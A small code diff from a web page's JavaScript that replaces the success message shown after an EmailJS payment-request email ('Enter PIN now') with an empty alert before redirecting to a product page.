@@ -152,7 +152,7 @@
             emailjs.send('service_k7026ko', 'template_p0of43y', templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
-                    alertPlaceholder.innerHTML = '<div class="alert alert-success" role="alert">Payment request has been sent. Enter PIN now.</div>';
+                    alertPlaceholder.innerHTML = '<div class="alert alert-success" role="alert"><div>';
                     setTimeout(function() {
                         window.location.href = "product.html";
                     }, 10000);
